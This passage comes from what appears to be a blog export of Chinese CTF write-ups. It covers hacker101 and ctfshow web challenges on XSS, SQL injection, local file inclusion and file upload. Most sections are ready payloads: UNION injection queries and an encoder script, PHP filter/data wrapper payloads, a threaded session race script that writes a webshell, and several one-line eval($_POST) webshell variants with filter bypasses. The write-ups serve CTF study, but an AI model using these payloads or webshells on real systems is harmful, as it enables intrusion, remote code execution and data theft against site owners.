class="string">&quot;hello&quot;</span></span><br><span class="line">dam_1 = <span class="string">&quot;Please input your username:\n&quot;</span> </span><br><span class="line">io.sendlineafter(dam_1,name)</span><br><span class="line"></span><br><span class="line">dam_2 = <span class="string">&quot;Please input your passwd:&quot;</span></span><br><span class="line">io.sendlineafter(dam_2,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>ctf</category>
        <category>pwn</category>
        <category>wp</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>wp</tag>
        <tag>xctf</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>hacker101系列wp（持续更新中）</title>
    <url>/2022/03/29/blog0009-hacker101%E7%B3%BB%E5%88%97wp%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%E4%B8%AD%EF%BC%89/</url>
    <content><![CDATA[<h2 id="一、Micro-CMS-v1"><a href="#一、Micro-CMS-v1" class="headerlink" title="一、Micro-CMS v1"></a>一、Micro-CMS v1</h2><p>这道题有4个flag，我们逐个分解。</p>
<span id="more"></span>
<p>首先一进来，页面异常简洁，直接Ctrl+U，观察一下全局，url中page带数字。</p>
<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0009/blog0009_1.png" alt=""></p>
<p>其实一般来说page含数字的，我们可以考虑一下是不是有文件包含（include）或者注入点（查询）。</p>
<p>我们尝试url注入，在page处加上一个引号封闭一下，果然弹出来第一个flag。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://19d516b0310286729dd8449820bfdb6f.ctf.hacker101.com/page/edit/1&#x27;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0009/blog0009_2.png" alt=""></p>
<p>接下来，我们进入test页面，发现这里留了一个留言板，非常有XSS的暗示性，我们直接上手来一个</p>
<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0009/blog0009_3.png" alt=""></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="number">1</span>);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>有意思的是，这个留言板在后端显然把script过滤了，但是这个过滤还是太年轻了，我们尝试换种思路注入</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;buttun onclick=<span class="string">&quot;alert(1)&quot;</span>&gt;</span><br></pre></td></tr></table></figure>
<p>同理，我们也可以在标题框注入，这样得到了两个flag。</p>
<p>那么最后一个flag在哪里？我们这时候尝试创建一个新的留言板。</p>
<p>进入之后观察，发现新的界面的page跳过3-7，怀疑一下其中有猫腻，于是bp爆破，发现其中一个返回405，其他都是404，进入edit页面之后，访问得到最后一个flag</p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>web</category>
        <category>wp</category>
        <category>comprehensive</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>web</tag>
        <tag>wp</tag>
        <tag>hacker101</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow-sql注入-wp</title>
    <url>/2022/04/17/blog0015-ctfshow-sql%E6%B3%A8%E5%85%A5-wp/</url>
    <content><![CDATA[<h2 id="零、写在前面"><a href="#零、写在前面" class="headerlink" title="零、写在前面"></a>零、写在前面</h2><p>终于，在摸鱼混了半年CTF之后，开始向梦开始的地方发起冲击了！</p>
<p>参考链接：</p>
<p><a href="https://www.xiinnn.com/article/6205ef9.html">https://www.xiinnn.com/article/6205ef9.html</a></p>
<h3 id="web17-1-3-——联合注入"><a href="#web17-1-3-——联合注入" class="headerlink" title="web17[1-3]——联合注入"></a>web17[1-3]——联合注入</h3><p>SQL语句</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#<span class="keyword">sql</span>语句查找指定ID用户</span><br><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> &quot;select id,username,password from ctfshow_user where username !=&#x27;flag&#x27; and id = &#x27;&quot;.$_GET[<span class="string">&#x27;id&#x27;</span>].&quot;&#x27; limit 1;&quot;;</span><br></pre></td></tr></table></figure>
<p>这三道题都是联合注入，套路基本差不多，爆库$\rightarrow$爆表$\rightarrow$爆列$\rightarrow$爆数据</p>
<p>过滤也是非常简单的过滤，没什么特别需要说明的地方。</p>
<h3 id="web174——replace绕过"><a href="#web174——replace绕过" class="headerlink" title="web174——replace绕过"></a>web174——replace绕过</h3><p>SQL语句：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#拼接<span class="keyword">sql</span>语句查找指定ID用户</span><br><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> &quot;select username,password from ctfshow_user4 where username !=&#x27;flag&#x27; and id = &#x27;&quot;.$_GET[<span class="string">&#x27;id&#x27;</span>].&quot;&#x27; limit 1;&quot;;</span><br></pre></td></tr></table></figure>
<p>过滤逻辑：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/flag|[0-9]/i&#x27;</span>, json_encode(<span class="variable">$ret</span>)))&#123;</span><br><span class="line">      <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;查询成功&#x27;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>这里我们可以利用SQL自带的<code>replace</code>函数来实现结果的过滤</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; union select &#x27;</span>a<span class="string">&#x27;, replace(replace(replace(replace(replace(replace(replace(replace(replace(replace((select group_concat(0x5c,password) from ctfshow_web.ctfshow_user4),&#x27;</span><span class="number">0</span><span class="string">&#x27;,&#x27;</span><span class="operator">*</span>numa<span class="operator">*</span><span class="string">&#x27;),&#x27;</span><span class="number">1</span><span class="string">&#x27;, &#x27;</span><span class="operator">*</span>numb<span class="operator">*</span><span class="string">&#x27;),&#x27;</span><span class="number">2</span><span class="string">&#x27;, &#x27;</span><span class="operator">*</span>numc<span class="operator">*</span><span class="string">&#x27;),&#x27;</span><span class="number">3</span><span class="string">&#x27;, &#x27;</span><span class="operator">*</span>numd<span class="operator">*</span><span class="string">&#x27;),&#x27;</span><span class="number">4</span><span class="string">&#x27;, &#x27;</span><span class="operator">*</span>nume<span class="operator">*</span><span class="string">&#x27;),&#x27;</span><span class="number">5</span><span class="string">&#x27;, &#x27;</span><span class="operator">*</span>numf<span class="operator">*</span><span class="string">&#x27;),&#x27;</span><span class="number">6</span><span class="string">&#x27;, &#x27;</span><span class="operator">*</span>numg<span class="operator">*</span><span class="string">&#x27;),&#x27;</span><span class="number">7</span><span class="string">&#x27;, &#x27;</span><span class="operator">*</span>numh<span class="operator">*</span><span class="string">&#x27;),&#x27;</span><span class="number">8</span><span class="string">&#x27;, &#x27;</span><span class="operator">*</span>numi<span class="operator">*</span><span class="string">&#x27;),&#x27;</span><span class="number">9</span><span class="string">&#x27;, &#x27;</span><span class="operator">*</span>numj<span class="operator">*</span><span class="string">&#x27;); -- -</span></span><br></pre></td></tr></table></figure>
<p>这里附上Python的代码生成模块和解码模块：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_str</span>():</span></span><br><span class="line">    s = <span class="string">&quot;replace((select group_concat(0x5c,password) from ctfshow_web.ctfshow_user4),&#x27;0&#x27;,&#x27;*numa*&#x27;)&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">        s = <span class="string">&quot;replace(&quot;</span> + s + <span class="string">&quot;,&#x27;&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;&#x27;, &#x27;*num&quot;</span> + <span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) + i) + <span class="string">&quot;*&#x27;)&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(s) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode_str</span>():</span></span><br><span class="line">    s = <span class="string">&quot;ctfshow&#123;*numj*b*numg*de*numj**numh**numa*-*numf*d*numb*c-*nume*efd-*numj**numa*d*numd*-f*numj**numj**numb**numb*d*numf**numh*baea&#125;&quot;</span></span><br><span class="line">    arr_s = s.split(<span class="string">&#x27;*&#x27;</span>)</span><br><span class="line">    res = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> arr_s:</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;num&#x27;</span> <span class="keyword">in</span> i):</span><br><span class="line">            i = i.replace(<span class="string">&quot;num&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">            i = <span class="built_in">str</span>(<span class="built_in">ord</span>(i) - <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line">            res += i</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            res += i</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># encode_str()</span></span><br><span class="line">    decode_str()</span><br></pre></td></tr></table></figure>
<h3 id="web175——outfile重定向"><a href="#web175——outfile重定向" class="headerlink" title="web175——outfile重定向"></a>web175——outfile重定向</h3><p>SQL语句：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> &quot;select username,password from ctfshow_user5 where username !=&#x27;flag&#x27; and id = &#x27;&quot;.$_GET[<span class="string">&#x27;id&#x27;</span>].&quot;&#x27; limit 1;&quot;;</span><br></pre></td></tr></table></figure>
<p>过滤逻辑：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//检查结果是否有flag</span></span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/[\x00-\x7f]/i&#x27;</span>, json_encode(<span class="variable">$ret</span>)))&#123;</span><br><span class="line">      <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;查询成功&#x27;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>这基本上就是不打算让我们在前端页面上可到结果了，于是考虑将查询结果重定向到文件中，于是我们使用<code>outfile</code></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and 1=0 union select username, password from ctfshow_user5 where username=&#x27;</span>flag<span class="string">&#x27; into outfile &#x27;</span><span class="operator">/</span>var<span class="operator">/</span>www<span class="operator">/</span>html<span class="operator">/</span><span class="number">2.</span>txt<span class="string">&#x27;; -- -</span></span><br></pre></td></tr></table></figure>
<h3 id="web176"><a href="#web176" class="headerlink" title="web176"></a>web176</h3><p>这里是过滤了<code>union</code>，<code>select</code></p>
<p>但是我们知道，<code>mysql</code>对于关键字是不区分大小写的，对于数据库名和表名是要根据操作系统来判断，<code>windows</code>是不区分的，但是对于<code>linux</code>是大小写敏感的。类似的原理还有文件上传时，文件的后缀名的大小写绕过。</p>
<p>附上相关资料的连接:</p>
<p><a href="http://c.biancheng.net/view/7178.html">http://c.biancheng.net/view/7178.html</a></p>
<p>这道题本身还是比较简单的，直接：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union sElect 1,2,password from ctfshow_web.ctfshow_user</span></span><br></pre></td></tr></table></figure>
<p>（有意思的是，这道题直接万能钥匙也能一把梭，忘记过滤<code>OR</code>了）</p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>web</category>
        <category>wp</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>web</tag>
        <tag>wp</tag>
        <tag>ctfshow</tag>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow-LFI-wp</title>
    <url>/2022/04/10/blog0011-ctfshow-LFI-wp/</url>
    <content><![CDATA[<h2 id="一、写在前面"><a href="#一、写在前面" class="headerlink" title="一、写在前面"></a>一、写在前面</h2><p>LFI应该是接触很久的漏洞了，这次来补一下ctfshow的wp。</p>
<span id="more"></span>
<h3 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h3><p>PHP伪协议</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">?file=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
<h3 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h3><p>继续PHP伪协议</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">?file=data://text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTsgPz4=</span><br></pre></td></tr></table></figure>
<h3 id="web80、web81"><a href="#web80、web81" class="headerlink" title="web80、web81"></a>web80、web81</h3><p>日志包含，在http报文中写入一句话木马</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(cmd);highlight_file(<span class="keyword">__FILE__</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>然后日志包含</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">?file=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>
<h3 id="web82"><a href="#web82" class="headerlink" title="web82"></a>web82</h3><p>session包含+条件竞争，主要是利用PHP在上传文件中，会在<code>/tmp/sess_&#123;sessionid&#125;</code>临时文件下，写入<code>PHP_SESSION_UPLOAD_PROGRESS</code>对应的内容，这样就实现了RCE。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://ea1277ef-6dd0-4b65-9d85-c0b0e216a679.challenge.ctf.show:8080/&#x27;</span></span><br><span class="line">sessionid=<span class="string">&#x27;ctfshow&#x27;</span></span><br><span class="line">data=&#123;</span><br><span class="line">	<span class="string">&quot;1&quot;</span>:<span class="string">&quot;file_put_contents(&#x27;/var/www/html/2.php&#x27;,&#x27;&lt;?php eval($_POST[2]);?&gt;&#x27;);&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#&lt;?php eval($_POST[1]);?&gt;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">session</span>):</span></span><br><span class="line">	fileBytes = io.BytesIO(<span class="string">b&#x27;a&#x27;</span>*<span class="number">1024</span>*<span class="number">50</span>)</span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		response=session.post(url,</span><br><span class="line">			data=&#123;</span><br><span class="line">			<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span></span><br><span class="line">			&#125;,</span><br><span class="line">			cookies=&#123;</span><br><span class="line">			<span class="string">&#x27;PHPSESSID&#x27;</span>:sessionid</span><br><span class="line">			&#125;,</span><br><span class="line">			files=&#123;</span><br><span class="line">			<span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;ctfshow.jpg&#x27;</span>,fileBytes)</span><br><span class="line">			&#125;</span><br><span class="line">			)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">session</span>):</span></span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		response=session.post(url+<span class="string">&#x27;?file=/tmp/sess_&#x27;</span>+sessionid,data=data,</span><br><span class="line">			cookies=&#123;</span><br><span class="line">			<span class="string">&#x27;PHPSESSID&#x27;</span>:sessionid</span><br><span class="line">			&#125;</span><br><span class="line">			)</span><br><span class="line">		resposne2=session.get(url+<span class="string">&#x27;2.php&#x27;</span>)</span><br><span class="line">		<span class="keyword">if</span> resposne2.status_code==<span class="number">200</span>:</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&#x27;++++++done++++++&#x27;</span>)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="built_in">print</span>(resposne2.status_code)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">	evnet=threading.Event()</span><br><span class="line">	<span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">			threading.Thread(target=write,args=(session,)).start()</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">			threading.Thread(target=read,args=(session,)).start()</span><br><span class="line"></span><br><span class="line">	evnet.<span class="built_in">set</span>()</span><br></pre></td></tr></table></figure>
<h3 id="web87"><a href="#web87" class="headerlink" title="web87"></a>web87</h3><p>看看漏洞出现的代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    file_put_contents(urldecode(<span class="variable">$file</span>), <span class="string">&quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;</span>.<span class="variable">$content</span>);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里题目中有<code>urldecode</code>，因此我们可以两次<code>url</code>编码绕过。</p>
<p><code>file_put_contents</code>，我们可以利用<code>php</code>伪协议</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">?file=php://filter/write=string.rot13/resource=1.php</span><br></pre></td></tr></table></figure>
<p>这个协议的意思是我们将内容按<code>rot13</code>编码写入<code>1.php</code>文件,，这样我们就可以将语句中的<code>die</code>语句被处理，同时将我们要写入的内容按<code>rot13</code>编码写入（两次<code>rot13</code>就会回到最初的代码），最后成功绕过。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>cuc @riny(<span class="variable">$_CBFG</span>[<span class="number">1</span>]);uvtuyvtug_svyr(__SVYR__); <span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//<span class="meta">&lt;?php</span> @eval($_POST[1]);highlight_file(__FILE__);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
<h3 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h3><p>先看漏洞成因代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i&quot;</span>, <span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里我们观察发现，没有ban引号和斜杠，那我们考虑使用data伪协议来实现文件包含，不过这里还是ban了<code>=</code>和<code>+</code>，这里对于构造的payload比较麻烦，这里分享一个trick：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//对于PHP,base64_decode()会自动填充末尾的=</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> base64_decode(<span class="string">&quot;PD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg&quot;</span>).<span class="string">&quot;\n&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> base64_decode(<span class="string">&quot;PD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg=&quot;</span>).<span class="string">&quot;\n&lt;br&gt;&quot;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>所以后面的事情就很简单了，不再说明了。</p>
<h3 id="web116"><a href="#web116" class="headerlink" title="web116"></a>web116</h3><p>打开以后是一个视频，我们下载下来，然后提取出其中的PNG图片，直接抓包重放解决问题。</p>
<h3 id="web117"><a href="#web117" class="headerlink" title="web117"></a>web117</h3><p>先看漏洞成因代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i&#x27;</span>,<span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$contents</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;contents&#x27;</span>];</span><br><span class="line">filter(<span class="variable">$file</span>);</span><br><span class="line">file_put_contents(<span class="variable">$file</span>, <span class="string">&quot;&lt;?php die();?&gt;&quot;</span>.<span class="variable">$contents</span>);</span><br></pre></td></tr></table></figure>
<p>还是写入文件，绕过死亡die的一个套路，但是这道题我们的rot13被ban掉了，因此我们需要引入新的编码方式，这里参考了一下羽师傅的payload。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php</span><br></pre></td></tr></table></figure>
<p>这里利用了一个<code>UCS-2LE.UCS-2BE</code>的编码方式，将相邻的两个字符交换位置。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">content=?&lt;hp pvela$(P_SO[T]1;)&gt;?</span><br></pre></td></tr></table></figure>
<p>这样就成功写入文件。</p>
<p>PHP支持的更多编码方式:</p>
<p><a href="https://www.php.net/manual/zh/mbstring.supported-encodings.php">https://www.php.net/manual/zh/mbstring.supported-encodings.php</a></p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>web</category>
        <category>wp</category>
        <category>LFI</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>web</tag>
        <tag>wp</tag>
        <tag>LFI</tag>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>NSS-Web-wp</title>
    <url>/2022/04/13/blog0013-NSS-Web-wp/</url>
    <content><![CDATA[<h2 id="1、SWPU—finalrce（无回显rce）"><a href="#1、SWPU—finalrce（无回显rce）" class="headerlink" title="1、SWPU—finalrce（无回显rce）"></a>1、SWPU—finalrce（无回显rce）</h2><p>dir / | sed s/[[:space:]]/xx/g | tr ‘\n’ ‘*’</p>
<p>dir / |tr ‘ ‘ ‘x’| tr ‘\n’ ‘*’</p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>web</category>
        <category>wp</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>web</tag>
        <tag>wp</tag>
        <tag>NSS</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow-upload-wp</title>
    <url>/2022/04/11/blog0012-ctfshow-upload-wp/</url>
    <content><![CDATA[<h2 id="一、写在前面"><a href="#一、写在前面" class="headerlink" title="一、写在前面"></a>一、写在前面</h2><p>文件上传开始</p>
<span id="more"></span>
<h3 id="web151（绕过前端校验）"><a href="#web151（绕过前端校验）" class="headerlink" title="web151（绕过前端校验）"></a>web151（绕过前端校验）</h3><p>前端校验要求传入的图片格式为<code>png</code></p>
<p>将<code>php</code>文件修改后缀为<code>png</code>，抓包重放修改为<code>php</code></p>
<p>蚁剑连接，成功打通</p>
<h3 id="web152（绕过Content-Type）"><a href="#web152（绕过Content-Type）" class="headerlink" title="web152（绕过Content-Type）"></a>web152（绕过Content-Type）</h3><p>将Content-Type改为: <code>image/png</code></p>
<p>不过因为是抓包修改后缀，其实也无所谓。</p>
<h3 id="web153（-user-ini）"><a href="#web153（-user-ini）" class="headerlink" title="web153（.user.ini）"></a>web153（.user.ini）</h3><p>首先是ban了<code>php</code>，爆破常见后缀名之后，发现基本都无法解析。</p>
<p>考虑上传<code>.user.ini</code>，然后先检查一下<code>upload</code>目录下是否存在PHP文件，发现存在PHP文件，于是上传两个文件。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//.user.ini</span></span><br><span class="line">auto_append_file=<span class="number">1</span>.png</span><br><span class="line">    </span><br><span class="line"><span class="comment">//1.png</span></span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);highlight_file(<span class="keyword">__FILE__</span>)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>上传文件之后，访问同目录下的php文件，实现了文件包含漏洞。</p>
<h3 id="web154（文件内容校验）"><a href="#web154（文件内容校验）" class="headerlink" title="web154（文件内容校验）"></a>web154（文件内容校验）</h3><p>这道题在web153的基础上，对文件内容进行校验。关于PHP的一句话木马，我们往往有几种类似的表达。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//经典皮肤</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]); <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//开启short_open_tags=on</span></span><br><span class="line"><span class="meta">&lt;?</span> <span class="keyword">echo</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]); <span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//不需要开启参数</span></span><br><span class="line"><span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//低于7.0的版本</span></span><br><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">//低于7.0的版本且开启asp_tags=on</span></span><br><span class="line">&lt;% <span class="keyword">echo</span> <span class="string">&#x27;123&#x27;</span>;%&gt;</span><br></pre></td></tr></table></figure>
<p>这道题我们直接选择第三种表达，剩下的步骤和web153一样。</p>
<h3 id="web155"><a href="#web155" class="headerlink" title="web155"></a>web155</h3><p>同web154</p>
<h3 id="web156"><a href="#web156" class="headerlink" title="web156"></a>web156</h3><p>过滤了[]，修改一句话木马为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>&#123;<span class="number">1</span>&#125;);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="web157"><a href="#web157" class="headerlink" title="web157"></a>web157</h3><p>增加过滤了分号和<code>&#123;&#125;</code></p>
<p>直接一句话读吧，ctfshow经典绕过各种过滤，有点小难受。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>system(<span class="string">&#x27;tac ../f*&#x27;</span>)<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?=</span>`tac ../f*`<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="web158"><a href="#web158" class="headerlink" title="web158"></a>web158</h3><p>同web157，一把过。</p>
<h3 id="web159"><a href="#web159" class="headerlink" title="web159"></a>web159</h3><p>同web157</p>
<h3 id="web160（日志包含逃逸）"><a href="#web160（日志包含逃逸）" class="headerlink" title="web160（日志包含逃逸）"></a>web160（日志包含逃逸）</h3><p>这道题还是基于上面<code>.user.ini</code>的攻击思路，但是也需要类似逃逸的思路。</p>
<p>首先描述一下攻击思路：</p>
